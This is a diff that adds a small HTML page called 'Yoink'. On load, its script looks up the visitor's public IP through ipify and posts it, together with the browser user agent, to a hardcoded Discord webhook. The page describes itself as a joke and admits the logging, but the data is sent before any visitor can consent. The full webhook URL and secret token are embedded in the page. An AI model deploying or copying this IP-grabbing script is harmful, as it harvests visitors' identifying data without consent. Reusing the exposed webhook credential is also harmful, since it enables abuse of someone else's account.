@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>Yoink</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/water.css">
+</head>
+<body>
+This pages (and ONLY this page, all other egg.cafe pages do NOT contain this) sends useragent info (and public IP) to a discord channel - feel free to spam the webhook - I'm doing this for a one off joke for friends.
+<h1>Rest assured that only my eyes will see this, because not only am I the only one in the server it is sent to, but I'm not smart enough to do anything with your ip</h1>
+  <script>
+async function sendToDiscord(message) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1289016492179853434/QRptUlooDtNSoZzMBSnAlsbCdb2nEVvjYrFBDdC7fYsGtXxVYkSz5HG-d_hQjaCtj2r6';
+
+    const payload = {
+        content: message, 
+    };
+
+    try {
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+        });
+
+        if (!response.ok) {
+            throw new Error(`Error: ${response.statusText}`);
+        }
+
+        console.log('Message sent to Discord successfully!');
+    } catch (error) {
+        console.error('Failed to send message to Discord:', error);
+    }
+}
+
+function myFunction() {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const theIpSilly = data.ip;
+            console.log(theIpSilly); 
+           
+            const output = "User Agent: " + navigator.userAgent + " | Public IP: " + theIpSilly;
+           
+            sendToDiscord(output);
+        })
+        .catch(error => {
+            console.log('Error:', error);
+        });
+}
+
+window.onload = myFunction;
+</script>
+
+
+  </body>
+  
+</html>
+
+
